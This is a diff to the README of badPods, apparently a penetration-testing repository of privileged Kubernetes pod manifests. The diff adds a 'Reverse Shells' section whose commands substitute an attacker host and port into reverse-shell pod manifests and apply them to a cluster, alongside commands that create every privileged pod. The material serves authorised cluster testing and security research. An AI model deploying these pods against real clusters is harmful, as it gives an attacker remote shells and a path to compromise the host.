@@ -29,26 +29,36 @@ Allowed Specification | What's the worst that can happen? | How?
 **Caveat:** There are many kubernetes specific security controls available to administrators that can reduce the impact of pods created with the following privileges. As is always the case with penetration testing, your milage may vary.
 
 
-### Usage
+## Usage
  Each resource in the `yamls` directory targets a specific attribute or a combination of attributes that expose the cluster to risk when allowed. Each subdirectory has it's own usage information which includes tailored post-exploitation ideas and steps.  
 
-## Create all pods in this repo
+### Create all pods in this repo
 
 ```bash
 # Clone repo
 git clone https://github.com/BishopFox/badPods
 
 # Create all pods (or at least try to create them)
-kubectl apply -f yaml --recursive [-n namespace]
 
-pod/pod-everything-allowed created
-pod/pod-hostipc created
-pod/pod-hostnetwork created
-pod/pod-hostpath created
-pod/pod-hostpid created
-pod/pod-priv-and-hostpid created
-pod/pod-priv-only created
+kubectl apply -f ./yaml/priv-and-hostpid/pod-priv-and-hostpid.yaml 
+kubectl apply -f ./yaml/hostpid-only/pod-hostpid-only.yaml 
+kubectl apply -f ./yaml/hostnetwork-only/pod-hostnetwork-only.yaml
+kubectl apply -f ./yaml/hostpath-only/pod-hostpath-only.yaml
+kubectl apply -f ./yaml/priv-only/pod-priv-only.yaml
+kubectl apply -f ./yaml/hostipc-only/pod-hostipc-only.yaml
+kubectl apply -f ./yaml/everything-allowed/pod-everything-allowed.yaml
+```
 
+### Reverse Shells
+If you are in a position where you can create pods but not exec into them, you can use the reverse shell version of each pod. To avoid having to edit each pod with your host and port, you can environment variables and the envsubst command. Remember to spin up all of your listeners first:
+
+```bash
+HOST="10.0.0.1" PORT="3111" envsubst < ./yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3112" envsubst < ./yaml/hostpid-only/pod-hostpid-only-revshell.yaml  | kubectl apply -f -
+HOST="10.0.0.1" PORT="3114" envsubst < ./yaml/hostnetwork-only/pod-hostnetwork-only-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3115" envsubst < ./yaml/hostpath-only/pod-hostpath-only-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/hostipc-only/pod-hostipc-only-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/everything-allowed/pod-everything-allowed-revshell.yaml | kubectl apply -f -
 ```
 
 ## Example with post exploitation notes: hostpid-only pod
